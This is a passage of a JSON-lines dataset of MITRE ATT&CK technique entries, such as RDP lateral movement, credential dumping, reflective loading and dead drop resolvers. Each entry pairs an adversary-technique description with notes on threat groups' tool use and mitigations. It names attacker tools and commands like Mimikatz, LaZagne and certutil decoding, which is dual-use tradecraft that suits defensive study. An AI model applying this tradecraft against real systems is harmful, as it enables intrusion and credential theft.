"QuasarRAT has a module for performing remote desktop access.", "njRAT has a module for performing remote desktop access.", "Cobalt Strike can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.", "Disable the RDP service if it is unnecessary.", "Pupy can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.", "Use remote desktop gateways.", "Koadic can enable remote desktop on the victim's machine.", "Wizard Spider has used RDP for lateral movement.", "Pysa has laterally moved using RDP connections. ", "Carbanak enables concurrent Remote Desktop Protocol (RDP) sessions.", "Cobalt Group has used Remote Desktop Protocol to conduct lateral movement.", "Fox Kitten has used RDP to log in and move laterally in the target environment.", "APT3 enables the Remote Desktop Protocol for persistence. APT3 has also interacted with compromised systems to browse and copy files through RDP sessions.", "jRAT can support RDP control.", "FIN8 has used RDP for lateral movement.", "APT39 has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.", "The APT1 group is known to have used RDP during operations.", "Use multi-factor authentication for remote logins.", "zwShell has used RDP for lateral movement.", "Imminent Monitor has a module for performing remote desktop access.", "Silence has used RDP for lateral movement.\t", "Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server.", "The Axiom group is known to have used RDP during operations.", "Chimera has used RDP to access targeted systems.", "SDBbot has the ability to use RDP to connect to victim's machines.", "Revenge RAT has a plugin to perform RDP access.\n", "Audit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups.", "FIN7 has used RDP to move laterally in victim environments.\n", "TEMP.Veles utilized RDP throughout an operation.\t", "APT41 used RDP for lateral movement.", "Do not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network.", "Patchwork attempted to use RDP to move laterally."], "is_subtechnique": true}
{"text": " Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014) A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets. Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices. For DoS attacks targeting the", "idx": "https://attack.mitre.org/techniques/T1498", "title": "Network Denial of Service", "entity": "Network Denial of Service", "entity_type": "techniques", "entity_context": ["In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.", "Lucifer can execute TCP, UDP,  and HTTP denial of service (DoS) attacks.", "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."], "is_subtechnique": false}
{"text": " Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet) In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)", "idx": "https://attack.mitre.org/techniques/T1609", "title": "Container Administration Command", "entity": "Container Administration Command", "entity_type": "techniques", "entity_context": ["Use read-only containers and minimal images when possible to prevent the execution of commands.", "Kinsing was executed with an Ubuntu container entry point that runs shell scripts.", "TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.", "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server.", "Ensure containers are not running as root by default.", "Siloscape can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.", "Hildegard was executed through the kubelet API run command and by executing commands on running containers."], "is_subtechnique": false}
{"text": " Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site. Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)", "idx": "https://attack.mitre.org/techniques/T1553", "title": "Subvert Trust Controls", "entity": "Subvert Trust Controls", "entity_type": "techniques", "entity_context": ["HTTP Public Key Pinning (HPKP) is one method to mitigate potential Adversary-in-the-Middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate. ", "Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Components may still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented.", "System settings can prevent applications from running that haven't been downloaded through the Apple Store (or other legitimate repositories) which can help mitigate some of these issues. Also enable application control solutions such as AppLocker and/or Device Guard to block the loading of malicious content.", "Windows Group Policy can be used to manage root certificates and the <code>Flags</code> value of <code>HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\ProtectedRoots</code> can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store. "], "is_subtechnique": false}
{"text": " Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages.", "idx": "https://attack.mitre.org/techniques/T1491", "title": "Defacement", "entity": "Defacement", "entity_type": "techniques", "entity_context": ["Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.\n"], "is_subtechnique": false}
{"text": " Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)", "idx": "https://attack.mitre.org/techniques/T1620", "title": "Reflective Code Loading", "entity": "Reflective Code Loading", "entity_type": "techniques", "entity_context": ["Cuba loaded the payload into memory using PowerShell. ", "ThiefQuest uses various API functions such as <code>NSCreateObjectFileImageFromMemory</code> to load and link in-memory payloads.", "Cobalt Strike's <code>execute-assembly</code> command can run a .NET executable within the memory of a sacrificial process by loading the CLR.", "PowerSploit reflectively loads a Windows PE file into a process.", "Lokibot has reflectively loaded the decoded DLL into memory. "], "is_subtechnique": false}
{"text": " Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)", "idx": "https://attack.mitre.org/techniques/T1546/005", "title": "Trap", "entity": "Trap", "entity_type": "techniques", "entity_context": [], "is_subtechnique": true}
{"text": " Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.", "idx": "https://attack.mitre.org/techniques/T1114/002", "title": "Remote Email Collection", "entity": "Remote Email Collection", "entity_type": "techniques", "entity_context": ["Chimera has harvested data from remote mailboxes including through execution of <code>\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost</code>.", "FIN4 has accessed and hijacked online email communications using stolen credentials.", "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.", "Use of multi-factor authentication for public-facing webmail servers is a recommended best practice to minimize the usefulness of usernames and passwords to adversaries.", "Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.", "Valak can collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise.", "MailSniper can be used for searching through email in Exchange and Office 365 environments.", "APT29 collected emails from specific individuals, such as executives and IT staff, using <code>New-MailboxExportRequest</code> followed by <code>Get-MailboxExportRequest</code>.", "HAFNIUM has used web shells to export mailbox data.", "LightNeuron collects Exchange emails matching rules specified in its configuration.", "Dragonfly 2.0 accessed email accounts using Outlook Web Access.", "Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords.", "Ke3chang used a .NET tool to dump data from Microsoft Exchange mailboxes.", "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.", "APT28 has collected emails from victim Microsoft Exchange servers."], "is_subtechnique": true}
{"text": " Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds) On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache) With SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials. Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)", "idx": "https://attack.mitre.org/techniques/T1003/005", "title": "Cached Domain Credentials", "entity": "Cached Domain Credentials", "entity_type": "techniques", "entity_context": ["Cachedump can extract cached password hashes from cache entry information.", "Okrum was seen using modified Quarks PwDump to perform credential dumping.", "Consider limiting the number of cached credentials (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Current Version\\Winlogon\\cachedlogonscountvalue)", "Leafminer used several tools for retrieving login and password information, including LaZagne.", "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.", "Pupy can use Lazagne for harvesting credentials.", "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.", "LaZagne can perform credential dumping from MSCache to obtain account and password information.", "Consider adding users to the \"Protected Users\" Active Directory security group. This can help limit the caching of users' plaintext credentials.", "MuddyWater has performed credential dumping with LaZagne.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network."], "is_subtechnique": true}
{"text": " Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).", "idx": "https://attack.mitre.org/techniques/T1102/001", "title": "Dead Drop Resolver", "entity": "Dead Drop Resolver", "entity_type": "techniques", "entity_context": ["PlugX uses Pastebin to store C2 addresses.", "Xbash can obtain a webpage hosted on Pastebin to update its C2 domain list.", "BADNEWS collects C2 information via a dead drop resolver.", "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services.", "Grandoreiro can obtain C2 information from Google Docs.", "BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.", "PolyglotDuke can use Twitter, Reddit, Imgur and other websites to get a C2 URL.", "Metamorfo has used YouTube to store and hide C&C server domains.", "BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names.", "Astaroth can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.", "Rocke has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.", "Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.", "Javali can read C2 information from Google Documents and YouTube.", "APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.", "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names. RTM has also hidden Pony C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.", "Some MiniDuke components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds."], "is_subtechnique": true}
{"text": " Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020) As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.", "idx": "https://attack.mitre.org/techniques/T1587", "title": "Develop Capabilities", "entity": "Develop Capabilities", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Kimsuky created and used a mailing toolkit to use in spearphishing attacks."], "is_subtechnique": false}
{"text": " Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.", "idx": "https://attack.mitre.org/techniques/T1548", "title": "Abuse Elevation Control Mechanism", "entity": "Abuse Elevation Control Mechanism", "entity_type": "techniques", "entity_context": ["System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk.", "Remove users from the local administrator group on systems.\n\nBy requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed.", "Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.", "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege.", "Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions.", "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking."], "is_subtechnique": false}
{"text": " Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1592", "title": "Gather Victim Host Information", "entity": "Gather Victim Host Information", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": false}
{"text": " Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.). Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).", "idx": "https://attack.mitre.org/techniques/T1592/003", "title": "Firmware", "entity": "Firmware", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos. Adversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).", "idx": "https://attack.mitre.org/techniques/T1586", "title": "Compromise Accounts", "entity": "Compromise Accounts", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": false}
{"text": " Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018) Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)", "idx": "https://attack.mitre.org/techniques/T1027/004", "title": "Compile After Delivery", "entity": "Compile After Delivery", "entity_type": "techniques", "entity_context": ["Cardinal RAT and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.", "Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).\t", "MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.", "Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in <code>Microsoft.CSharp.CSharpCodeProvider</code> class.\t", "njRAT has used AutoIt to compile the payload and main script into a single executable after delivery."], "is_subtechnique": true}
{"text": " Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure.", "idx": "https://attack.mitre.org/techniques/T1572", "title": "Protocol Tunneling", "entity": "Protocol Tunneling", "entity_type": "techniques", "entity_context": ["OilRig has used the Plink utility and other tools to create tunnels to C2 servers.", "FLIPSIDE uses RDP to tunnel traffic from a victim environment.", "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.", "Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.", "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.", "CostaRicto has set up remote SSH tunneling into the victim's environment from a malicious domain.", "Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as Ngrok and custom tool SSHMinion.", "The QakBot proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.", "Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.", "Industroyer attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.", "Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure.", "Cobalt Group has used the Plink utility to create SSH tunnels.", "Ngrok can tunnel RDP and other services securely over internet connections.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ", "Consider filtering network traffic to untrusted or known bad domains and resources. "], "is_subtechnique": false}
{"text": " Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.", "idx": "https://attack.mitre.org/techniques/T1588/003", "title": "Code Signing Certificates", "entity": "Code Signing Certificates", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "MegaCortex has used code signing certificates issued to fake companies to bypass security controls.", "Wizard Spider obtained a code signing certificate signed by Digicert for some of its malware."], "is_subtechnique": true}
{"text": " Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "idx": "https://attack.mitre.org/techniques/T1140", "title": "Deobfuscate/Decode Files or Information", "entity": "Deobfuscate/Decode Files or Information", "entity_type": "techniques", "entity_context": ["AppleSeed can decode its payload prior to execution.", "BackConfig has used a custom routine to decrypt strings.", "VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.", "More_eggs will decode malware components that are then dropped to the system.", "SDBbot has the ability to decrypt and decompress its payload to enable code execution.", "Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.", "LookBack has a function that decrypts malicious data.", "SideTwist can decode and decrypt messages received from C2.", "RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.\t", "CostaBricks has the ability to use bytecode to decrypt embedded payloads.", "SoreFang can decode and decrypt exfiltrated data sent to C2.", "BabyShark has the ability to decode downloaded files prior to execution.", "menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used <code>certutil -decode</code> to decode files on the victim’s machine when dropping UPPERCUT.", "Kwampirs decrypts and extracts a copy of its main DLL payload when executing.", "Kessel has decrypted the binary's configuration once the <code>main</code> function was launched.", "Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.", "BRONZE BUTLER downloads encoded payloads and decodes them on the victim.", "Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.", "Clop has used a simple XOR operation to decrypt strings.", "GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.", "Taidoor can use a stream cipher to decrypt stings used by the malware.", "certutil has been used to decode binaries hidden inside certificate files as Base64 information.", "APT29 used 7-Zip to decode its Raindrop malware.", "Spark has used a custom XOR algorithm to decrypt the payload. ", "KGH_SPY can decrypt encrypted strings and write them to a newly created folder.", "Bundlore has used <code>openssl</code> to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data.", "Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption. ", "RainyDay can decrypt its payload via a XOR key.", "FIVEHANDS has the ability to decrypt its payload prior to execution.", "An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.", "Honeybee drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.", "PolyglotDuke can use a custom algorithm to decrypt strings used by the malware.", "DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules. ", "POWERSTATS can deobfuscate the main backdoor code.", "ShadowPad has decrypted a binary blob to start execution.", "MirageFox has a function for decrypting data containing C2 configuration information.", "Frankenstein has deobfuscated base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.  ", "Denis will decrypt important strings used for C&C communication.", "Kerrdown can decode, decrypt, and decompress multiple layers of shellcode.", "ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.", "gh0st RAT has decrypted and loaded the gh0st RAT 